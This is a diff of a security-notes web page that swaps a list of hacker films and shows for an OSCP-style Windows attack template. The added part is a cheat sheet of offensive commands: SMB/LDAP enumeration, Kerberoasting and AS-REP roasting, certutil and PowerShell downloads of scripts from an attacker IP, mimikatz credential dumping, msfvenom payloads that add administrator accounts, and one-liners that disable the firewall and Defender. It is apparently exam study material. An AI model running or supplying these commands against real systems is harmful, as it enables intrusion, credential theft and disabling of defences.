@@ -10,18 +10,18 @@
     <meta name="generator" content="Retype 4.1.0">
 
     <!-- Primary Meta Tags -->
-    <title>Media to consume -</title>
-    <meta name="title" content="Media to consume -">
-    <meta name="description" content="Silicon Valley">
+    <title>Initial Access</title>
+    <meta name="title" content="Initial Access">
+    <meta name="description" content="export IP={IP}">
 
     <!-- Canonical -->
-    <link rel="canonical" href="/random/media/">
+    <link rel="canonical" href="/oscp/template-windows/">
 
     <!-- Open Graph -->
     <meta property="og:type" content="website">
-    <meta property="og:url" content="/random/media/">
-    <meta property="og:title" content="Media to consume -">
-    <meta property="og:description" content="Silicon Valley">
+    <meta property="og:url" content="/oscp/template-windows/">
+    <meta property="og:title" content="Initial Access">
+    <meta property="og:description" content="export IP={IP}">
     <meta property="og:site_name" content="Annsh Security Notes">
     <meta property="og:locale" content="en_US">
 
@@ -32,6 +32,7 @@
     <script data-cfasync="false" src="../../resources/js/config.js?v=4.1.0.826276590403" data-turbo-eval="false" defer></script>
     <script data-cfasync="false" src="../../resources/js/retype.js?v=4.1.0" data-turbo-eval="false" defer></script>
     <script id="lunr-js" data-cfasync="false" src="../../resources/js/lunr.js?v=4.1.0.826276590403" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../resources/js/prism.js?v=4.1.0.826276590403" defer></script>
 </head>
 <body>
     <div id="retype-app" class="relative text-base antialiased text-base-text bg-base-bg font-body">
@@ -135,102 +136,205 @@
                 <!-- Rendered if sidebar right is enabled -->
                 <div id="retype-sidebar-right-toggle"></div>
                 <!-- Page content  -->
-<doc-anchor-target id="media-to-consume--" class="break-words">
+<doc-anchor-target id="ip">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#ip">#</doc-anchor-trigger>
+        <span>IP:</span>
+    </h2>
+</doc-anchor-target>
+<hr>
+<doc-anchor-target id="nmap-tcp">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#nmap-tcp">#</doc-anchor-trigger>
+        <span>Nmap TCP</span>
+    </h2>
+</doc-anchor-target>
+<div id="nmap-tcp-code-1" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash"> </code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="nmap-udp">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#nmap-udp">#</doc-anchor-trigger>
+        <span>Nmap UDP</span>
+    </h2>
+</doc-anchor-target>
+<div id="nmap-udp-code-1" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash"> </code></pre>
+</doc-codeblock></div>
+<hr>
+<doc-anchor-target id="initial-checks">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#initial-checks">#</doc-anchor-trigger>
+        <span>Initial Checks:</span>
+    </h2>
+</doc-anchor-target>
+<p><code translate="no" v-pre>export IP={IP}</code></p>
+<p><code translate="no" v-pre>nxc smb $IP -u '' -p '' --generate-hosts-file hosts</code>
+<code translate="no" v-pre>nxc smb $IP -u '' -p '' --generate-krb5-file krb5.conf</code>
+<code translate="no" v-pre>sudo ntpdate $IP</code>
+<code translate="no" v-pre>nxc smb $IP -u '' -p ''</code>
+<code translate="no" v-pre>nxc smb $IP -u 'guest' -p ''</code>
+<code translate="no" v-pre>nxc ldap $IP -u 'guest' -p '' -M get-desc-users</code>
+<code translate="no" v-pre>nxc ldap $IP -u '' -p '' -M get-desc-users</code></p>
+<p><strong>If any work go for:</strong></p>
+<p><code translate="no" v-pre>--shares</code></p>
+<p><code translate="no" v-pre>-M gpp_password</code></p>
+<p><code translate="no" v-pre>-M gpp_autologin</code></p>
+<p><code translate="no" v-pre>-M powershell_history</code></p>
+<p><code translate="no" v-pre>-M keepass_discover</code></p>
+<p><code translate="no" v-pre>-M recyclebin</code></p>
+<p><code translate="no" v-pre>-M spider_plus --share 'SHARE_NAME'</code></p>
+<p><code translate="no" v-pre>--rid-brute | grep SidTypeUser | cut -d &quot;\\&quot; -f 2 | cut -d &quot; &quot; -f 1 | grep -v \\$ &gt; users</code></p>
+<p><code translate="no" v-pre>--users-export users</code></p>
+<p><code translate="no" v-pre>nxc ldap $IP -u &lt;u&gt; -p &lt;p&gt; --asreproast asreproast.out</code></p>
+<p><code translate="no" v-pre>nxc ldap $IP -u &lt;u&gt; -p &lt;p&gt; --kerberoasting kerberoasting.out</code></p>
+<p><code translate="no" v-pre>nxc ldap $IP -u &lt;u&gt; -p &lt;p&gt; --no-preauth-targets users --kerberoasting output.txt</code></p>
+<p>Creds found:</p>
+<p><code translate="no" v-pre>--shares</code></p>
+<p><code translate="no" v-pre>nxc ldap &lt;ip&gt; -u user -p pass --bloodhound --collection All --dns-server &lt;IP_DC&gt;</code></p>
+<p><code translate="no" v-pre>kerbrute userenum --dc 192.168.107.162 -d sub.poseidon.yzx /opt/SecLists/Usernames/xato-net-10-million-usernames.txt</code></p>
+<p><code translate="no" v-pre>impacket-GetNPUsers sub.poseidon.yzx/ -no-pass -usersfile users -dc-ip 192.168.107.162</code></p>
+<p><code translate="no" v-pre>GetUserSPNs.py -outputfile kerberoastables.txt -dc-ip 10.10.109.146 'oscp.exam/eric.wallows:EricLikesRunning800' -request</code></p>
+<p><code translate="no" v-pre>GetNPUsers.py -dc-ip 192.168.193.158 -dc-host zeus.corp 'zeus.corp/db_user:Password123!' -request</code></p>
+<doc-anchor-target id="initial-access" class="break-words">
     <h1>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#media-to-consume--">#</doc-anchor-trigger>
-        <span>Media to consume -</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#initial-access">#</doc-anchor-trigger>
+        <span>Initial Access</span>
     </h1>
 </doc-anchor-target>
-<doc-anchor-target id="shows-">
+<doc-anchor-target id="ports-open">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#shows-">#</doc-anchor-trigger>
-        <span>Shows :</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#ports-open">#</doc-anchor-trigger>
+        <span>Ports Open:</span>
     </h3>
 </doc-anchor-target>
-<p>Silicon Valley</p>
-<p>Mr Robot</p>
-<p>Halt and Catch Fire</p>
-<p>The Playlist</p>
-<p>Devs</p>
-<p>Betas</p>
-<p>Startup (Korean)</p>
-<p>Startup (not Korean)</p>
-<p>Black Mirror</p>
-<p>How to Sell Drugs Online (Fast)</p>
-<p>The IT Crowd</p>
-<p>Control Z</p>
-<p>The Undeclared War</p>
-<p>Super Pumped: The Battle for Uber</p>
-<p>WeCrashed</p>
-<p>Mythic Quest</p>
-<doc-anchor-target id="movies-">
+<doc-anchor-target id="80">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#movies-">#</doc-anchor-trigger>
-        <span>Movies :</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#80">#</doc-anchor-trigger>
+        <span>80</span>
     </h3>
 </doc-anchor-target>
-<p>Whoami (2014)</p>
-<p>Social Network (2010)</p>
-<p>Wikileaks : The Fifth Estate (2013)</p>
-<p>Hacker (2016)</p>
-<p>Pirates of Silicon Valley (1999)</p>
-<p>Blackberry (2023)</p>
-<p>The billion dollar code (2021)</p>
-<p>Sneakers (1992)</p>
-<p>The Imitation Game (2014)</p>
-<p>Eagle eye (2008)</p>
-<p>The Matrix (1999 - 2003 - 2003 - 2021)</p>
-<p>The girl with the dragon tattoo (2011)</p>
-<p>Tron (1982 - 2010)</p>
-<p>Existenz (1999)</p>
-<p>Ex machina (2014)</p>
-<p>Takedown (2000)</p>
-<p>Die Hard 4 (2007)</p>
-<p>Office Space (1999)</p>
-<p>Hackers (1995)</p>
-<p>The Net (1995)</p>
-<p>Blackhat (2015)</p>
-<p>Swordfish (2001)</p>
-<p>Enhanced (2009)</p>
-<p>War Games (1983)</p>
-<p>Anon (2018)</p>
-<p>Antitrust (2001)</p>
-<p>Tetris (2023)</p>
-<p>Jobs (2013)</p>
-<doc-anchor-target id="documentaries-">
+<doc-anchor-target id="nikto">
+    <h4>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#nikto">#</doc-anchor-trigger>
+        <span>Nikto:</span>
+    </h4>
+</doc-anchor-target>
+<div id="nikto-code-1" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash"> </code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="wappalyzer">
+    <h4>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#wappalyzer">#</doc-anchor-trigger>
+        <span>Wappalyzer:</span>
+    </h4>
+</doc-anchor-target>
+<doc-anchor-target id="source-code">
+    <h4>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#source-code">#</doc-anchor-trigger>
+        <span>Source Code:</span>
+    </h4>
+</doc-anchor-target>
+<doc-anchor-target id="directories-fuzzing">
+    <h4>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#directories-fuzzing">#</doc-anchor-trigger>
+        <span>Directories Fuzzing</span>
+    </h4>
+</doc-anchor-target>
+<p><strong>Cheatsheet:</strong></p>
+<div id="directories-fuzzing-code-1" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">===DIRECTORY FUZZING:
+gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -k -t 30 --random-agent --exclude-length 6765
+
+===DIRECTORY FUZZING:
+ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v
+
+===AUTHENTICATED FUZZING DIRECTORIES:
+wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 -d &quot;SESSIONID=value&quot; &quot;$URL&quot;
+
+===FUZZ Directories:
+wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-directories.txt --hc 404 &quot;$URL&quot;
+
+Also try: /opt/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
+/opt/SecLists/Discovery/Web-Content/common.txt</code></pre>
+</doc-codeblock></div>
+<p><strong>Result:</strong></p>
+<div id="directories-fuzzing-code-2" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash"> </code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="files-fuzzing-add-extensions">
+    <h4>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#files-fuzzing-add-extensions">#</doc-anchor-trigger>
+        <span>Files Fuzzing (add extensions)</span>
+    </h4>
+</doc-anchor-target>
+<p><strong>Cheatsheet:</strong></p>
+<div id="files-fuzzing-add-extensions-code-1" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">===AUTHENTICATED FILE FUZZING:
+wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-medium-files.txt --hc 404 -d &quot;SESSIONID=value&quot; &quot;$URL&quot;
+
+
+===FILE FUZZING:
+gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt -k -t 30 -x php,html,htm --random-agent --exclude-length 6765</code></pre>
+</doc-codeblock></div>
+<p><strong>Result:</strong></p>
+<div id="files-fuzzing-add-extensions-code-2" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-bash"><code v-pre class="language-bash"> </code></pre>
+</doc-codeblock></div>
+<p><code translate="no" v-pre>ffuf -request ~/boxes/aoc/brute -request-proto http -w numbers</code></p>
+<doc-anchor-target id="privilege-escalation">
+    <h1>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#privilege-escalation">#</doc-anchor-trigger>
+        <span>Privilege Escalation</span>
+    </h1>
+</doc-anchor-target>
+<doc-anchor-target id="windows">
     <h3>
-        <doc-anchor-trigger class="header-anchor-trigger" to="#documentaries-">#</doc-anchor-trigger>
-        <span>Documentaries :</span>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#windows">#</doc-anchor-trigger>
+        <span>Windows:</span>
     </h3>
 </doc-anchor-target>
-<p>We Steal Secrets: The Story of Wiki Leaks <a href="https://www.youtube.com/watch?v=WUjA_hcYzzI">https://www.youtube.com/watch?v=WUjA_hcYzzI</a></p>
-<p>The Social Media Dilemma <a href="https://www.youtube.com/watch?v=uaaC57tcci0">https://www.youtube.com/watch?v=uaaC57tcci0</a></p>
-<p>The Internet&#x27;s Own Boy: The Story of Aaron Swartz. <a href="https://www.youtube.com/watch?v=9vz06QO3UkQ">https://www.youtube.com/watch?v=9vz06QO3UkQ</a></p>
-<p>Zero Days <a href="https://www.youtube.com/watch?v=C8lj45IL5J4&amp;t=0">https://www.youtube.com/watch?v=C8lj45IL5J4&amp;t=0</a></p>
-<p>Wanna Cry: The World&#x27;s Largest Ransomware Attack <a href="https://www.youtube.com/watch?v=PKHH_gvJ_hA&amp;t=0">https://www.youtube.com/watch?v=PKHH_gvJ_hA&amp;t=0</a></p>
-<p>Hackers Ruined Christmas For 100,000 People by Crumb <a href="https://www.youtube.com/watch?v=ezkY3Mij894&amp;t=0">https://www.youtube.com/watch?v=ezkY3Mij894&amp;t=0</a></p>
-<p>Lazarus: The Rise of North Korean Cyber Criminals <a href="https://www.youtube.com/watch?v=18IbbNL7kAE">https://www.youtube.com/watch?v=18IbbNL7kAE</a></p>
-<p>L0pht: Heavy Industries Video Press Kit (1999) <a href="https://www.youtube.com/watch?v=P5j7chCzzPA">https://www.youtube.com/watch?v=P5j7chCzzPA</a></p>
-<p>The Man Who Angered Anonymous and Lived to Regret It <a href="https://www.youtube.com/watch?v=uFw66YyHD6E">https://www.youtube.com/watch?v=uFw66YyHD6E</a></p>
-<p>TBP AFK: The Pirate Bay Away From His Keyboard <a href="https://www.youtube.com/watch?v=eTOKXCEwo_8">https://www.youtube.com/watch?v=eTOKXCEwo_8</a></p>
-<p>The Face of Anonymous</p>
-<p>The rise and rise of Bitcoin</p>
-<p>Social Dilemma</p>
-<p>Terms and conditions may apply</p>
-<p>Revolution OS</p>
-<p>The Internet&#x27;s Own Boy: The Story of Aaron Swartz</p>
-<p>The Code: Story of Linux</p>
-<p>Lo and Behold: Reveries of the Connected World</p>
-<p>Anonymous - The Hacker Wars</p>
-<p>High Score</p>
-<p>Citizenfour</p>
-<p>Coded Bias</p>
-<p>Valley of the boom (docudrama)</p>
-<p>From Bedrooms to Billions (2014 - 2016 - 2020)</p>
-<p>Micro Men</p>
-<p>Indie Game - The Movie</p>
-<p>The New 8-Bit Heroes</p>
-<p>Inside Bill&#x27;s Brain</p>
+<p>Penelope:
+<code translate="no" v-pre>run upload_privesc_scripts</code>
+<code translate="no" v-pre>run upload_credump_scripts</code>
+<code translate="no" v-pre>run ligolo</code></p>
+<p>certutil.exe -urlcache -split -f http://&lt;Our_IP&gt;:8080/shell.bat shell.bat</p>
+<p>.\mimikatz.exe &quot;log&quot; &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::lsa /inject&quot; &quot;sekurlsa::logonpasswords&quot; exit</p>
+<p>IEX(IWR <a href="http://192.168.45.212/PrivescCheck.ps1">http://192.168.45.212/PrivescCheck.ps1</a> -UseBasicParsing); Invoke-PrivescCheck</p>
+<p>powershell -ep bypass -c &quot;. .\PrivescCheck.ps1; Invoke-PrivescCheck -Risky -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML&quot;</p>
+<p>PS C:\Users\Public&gt; . .\PowerUp.ps1; Invoke-AllChecks</p>
+<p>winPEAS colors - REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1</p>
+<p>(Get-PSReadlineOption).HistorySavePath
+<code translate="no" v-pre>C:\Users\[user]\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine</code></p>
+<p>Unusual binaries on C:/Users/* ? transfer to kali and use strings</p>
+<p>Don&#x27;t forget to look for <code translate="no" v-pre>windows.old</code></p>
+<p><code translate="no" v-pre>Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue</code></p>
+<p>Add admin:</p>
+<div id="windows-code-1" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">net user itzvenom Password123! /add &amp;&amp; net localgroup administrators itzvenom /add</code></pre>
+</doc-codeblock></div>
+<div id="windows-code-2" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">msfvenom -p windows/exec CMD='net localgroup administrators yoshi /add' -f exe &gt; command.exe</code></pre>
+</doc-codeblock></div>
+<div id="windows-code-3" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">msfvenom -p windows/adduser USER=itzvenom PASS='P@ssw0rd!' -f exe &gt; adduser.exe
+
+runas /user:itzvenom cmd
+Enter the password for itzvenom:
+Attempting to start cmd as user &quot;DEV04\itzvenom&quot; ...</code></pre>
+</doc-codeblock></div>
+<div id="windows-code-4" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">net user [username] [new password]</code></pre>
+</doc-codeblock></div>
+<p>Disable firewall/AV:</p>
+<div id="windows-code-5" class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-none"><code v-pre class="language-none">netsh advfirewall set allprofiles state off
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+
+Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -DisableIOAVProtection $true;Set-MPPreference -DisableBehaviorMonitoring $true;Set-MPPreference -DisableBlockAtFirstSeen $true;Set-MPPreference -DisableEmailScanning $true;Set-MPPReference -DisableScriptScanning $true;Set-MpPreference -DisableIOAVProtection $true;Add-MpPreference -ExclusionPath &quot;C:\Windows\Temp&quot;</code></pre>
+</doc-codeblock></div>
+<p>whoami; hostname; ipconfig; type C:\Users\Administrator\Desktop\proof.txt
+whoami; hostname; ipconfig; type C:\Users\Administrator\Desktop\local.txt</p>
 
                 
                 <!-- Required only on API pages -->
@@ -238,7 +342,7 @@
             </div>
             <footer id="retype-content-footer" class="clear-both">
                 <div class="flex flex-wrap items-center justify-between mt-14">
-                    <a id="retype-edit-this-page" class="my-2.5 inline-flex items-center text-sm whitespace-nowrap text-body-link font-body-link hover:text-body-link-hover hover:underline" href="https://github.com/AnnshAgrawaal/blog/blob/main/Random/Media.md" target="_blank" rel="noopener">
+                    <a id="retype-edit-this-page" class="my-2.5 inline-flex items-center text-sm whitespace-nowrap text-body-link font-body-link hover:text-body-link-hover hover:underline" href="https://github.com/AnnshAgrawaal/blog/blob/main/OSCP/Template Windows.md" target="_blank" rel="noopener">
                         <svg class="mr-1.5" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M20 12c-.55 0-1 .45-1 1v7c0 .55-.45 1-1 1H4c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h7c.55 0 1-.45 1-1s-.45-1-1-1H4C2.35 3 1 4.35 1 6v14c0 1.65 1.35 3 3 3h14c1.65 0 3-1.35 3-3v-7c0-.55-.45-1-1-1z" /><path d="M22.21 1.79c-1.18-1.18-3.24-1.18-4.41 0l-9.5 9.5c-.13.13-.22.29-.26.46l-1 4c-.08.34.01.7.26.95.18.2.44.3.7.3.08 0 .16-.01.24-.03l4-1c.18-.04.34-.13.46-.26l9.5-9.5c1.22-1.22 1.22-3.2.01-4.42zm-1.42 3l-9.3 9.3-2.11.53.53-2.11 9.3-9.3c.42-.42 1.16-.42 1.59 0 .43.43.43 1.15-.01 1.58z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                         <span>Edit this page</span>
                     </a>
@@ -246,20 +350,20 @@
             
                 <nav id="retype-nextprev" class="print:hidden flex mt-14">
                     <div class="w-1/2">
-                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../oscp/ports/">
+                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../oscp/cheatsheet/">
                             <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                             <span>
                                 <span class="block text-xs font-normal text-base-text-muted">Previous</span>
-                                <span class="block mt-1">Ports</span>
+                                <span class="block mt-1">Cheatsheet</span>
                             </span>
                         </a>
                     </div>
             
                     <div class="w-1/2">
-                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../security-notes/">
+                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../oscp/ports/">
                             <span>
                                 <span class="block text-xs font-normal text-right text-base-text-muted">Next</span>
-                                <span class="block mt-1">Security Notes</span>
+                                <span class="block mt-1">Ports</span>
                             </span>
                             <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                         </a>
@@ -303,6 +407,6 @@
 
     <div id="retype-overlay-target"></div>
 
-    <script data-cfasync="false">window.__DOCS__ = { "title": "Media to consume -", level: 2, icon: "file", hasPrism: false, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+    <script data-cfasync="false">window.__DOCS__ = { "title": "Initial Access", level: 2, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
 </body>
 </html>
